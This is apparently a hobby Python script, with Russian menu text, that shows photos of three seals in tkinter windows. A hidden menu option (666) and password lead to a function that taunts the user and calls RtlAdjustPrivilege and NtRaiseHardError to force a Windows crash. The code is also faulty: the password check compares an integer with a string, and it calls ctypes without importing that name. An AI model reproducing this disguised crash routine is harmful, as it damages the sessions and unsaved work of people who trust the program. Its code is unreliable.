from tkinter import *  
from PIL import ImageTk,Image
import time
from ctypes import *
from ctypes.wintypes import *

def yukipic():
    yuki = Tk()
    yuki.title('Кольчатая нерпа Юки')
    canvas = Canvas(yuki, width = 400, height = 533)  
    canvas.pack()  
    img = ImageTk.PhotoImage(Image.open("yuki.jpg"))  
    canvas.create_image(20, 20, anchor=NW, image=img) 
    yuki.mainloop()

def kroshikpic():
    kroshik = Tk()
    kroshik.title('Ладожская нерпа Крошик')
    canvas = Canvas(kroshik, width = 653, height = 432)  
    canvas.pack()  
    img = ImageTk.PhotoImage(Image.open("kroshik.jpg"))  
    canvas.create_image(20, 20, anchor=NW, image=img) 
    kroshik.mainloop()

def zhrunpic():
    zhrun = Tk()
    zhrun.title('Белёк Жрун')
    canvas = Canvas(zhrun, width = 924, height = 537)  
    canvas.pack()  
    img = ImageTk.PhotoImage(Image.open("zhrun.jpg"))  
    canvas.create_image(20, 20, anchor=NW, image=img) 
    zhrun.mainloop()

def PassProtect():
    print('Please enter the password for activating Admin mode.')
    a = int(input())
    if a == 'HacknetIsTheBest':
        z666()
    else:
        print('Wrong password')
def z666():
    print('CRITICAL PROGRAM ERROR - CANNOT CONTINUE OPERATING')
    time.sleep(2)
    print('Hey.')
    time.sleep(0.5)
    print('Do you know what you just did?!')
    time.sleep(0.5)
    print('YOU JUST KILLED THE SEAL LIBRARY!!!')
    time.sleep(0.5)
    print("Now I'll kill your session.")
    time.sleep(0.5)
    print('Say thanks to MSFT for their NtRaiseHardError.')
    time.sleep(0.5)
    print('Goodbye.')
    time.sleep(1)
    tmp1 = c_bool()
    tmp2 = DWORD()
    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, byref(tmp1))
    ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, byref(tmp2))

def shell():
    print('*************************************')
    print('УНИВЕРСАЛЬНАЯ ОБОЛОЧКА SEAL SOLUTIONS')
    print('         SEAL SOLUTIONS, 2020        ')
    print('*************************************')
    print(' ')
    print('1. Открыть фотографию Юки')
    print('2. Открыть фотографию Крошика')
    print('3. Открыть фотографию Жруна')
    print('Введите число от 1 до 3 для выбора.')
    whattoopen = int(input())
    if whattoopen == 666:
        PassProtect()
    elif whattoopen == 1:
        yukipic()
    elif whattoopen == 2:
        kroshikpic()
    elif whattoopen == 3:
        zhrunpic()
    else:
        print('Невалидный выбор.')

shell()
